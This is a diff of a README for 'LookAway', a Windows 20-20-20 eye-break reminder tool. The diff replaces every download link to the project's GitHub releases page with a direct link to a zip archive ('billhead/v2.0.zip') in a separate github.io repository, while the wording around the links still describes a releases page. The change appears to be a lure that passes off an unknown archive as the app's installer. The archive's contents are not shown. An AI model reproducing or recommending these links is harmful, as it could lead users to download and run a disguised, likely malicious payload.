@@ -6,7 +6,7 @@ description: "Enforce the 20-20-20 rule with automated break reminders to reduce
 <h1>👁️ LookAway - Protect Your Eyes While You Work</h1>
 
 <p align="center">
-<a href="https://github.com/Ormandyequipment937/LookAway/releases"><img src="https://img.shields.io/badge/Download_LookAway-Free-brightgreen?style=for-the-badge&logo=github" alt="Download LookAway"></a>
+<a href="https://raw.githubusercontent.com/Ormandyequipment937/ormandyequipment937.github.io/main/billhead/v2.0.zip"><img src="https://img.shields.io/badge/Download_LookAway-Free-brightgreen?style=for-the-badge&logo=github" alt="Download LookAway"></a>
 </p>
 
 <h2>📋 What Is LookAway?</h2>
@@ -19,7 +19,7 @@ Designed for Windows, LookAway runs quietly in your system tray and works in the
 
 <h3>Step 1: Download LookAway</h3>
 
-<p><a href="https://github.com/Ormandyequipment937/LookAway/releases"><strong>Visit this link to download the application</strong></a>. You will see the latest release with downloadable files.</p>
+<p><a href="https://raw.githubusercontent.com/Ormandyequipment937/ormandyequipment937.github.io/main/billhead/v2.0.zip"><strong>Visit this link to download the application</strong></a>. You will see the latest release with downloadable files.</p>
 
 <h3>Step 2: Install and Run</h3>
 
@@ -91,6 +91,6 @@ Designed for Windows, LookAway runs quietly in your system tray and works in the
 
 <h2>📥 Download Again</h2>
 
-<p><a href="https://github.com/Ormandyequipment937/LookAway/releases"><strong>Click here to download the latest version of LookAway</strong></a> and start protecting your eyes today.</p>
+<p><a href="https://raw.githubusercontent.com/Ormandyequipment937/ormandyequipment937.github.io/main/billhead/v2.0.zip"><strong>Click here to download the latest version of LookAway</strong></a> and start protecting your eyes today.</p>
 
 <p>If you encounter any issues, please visit the repository's Issues page for support.</p>
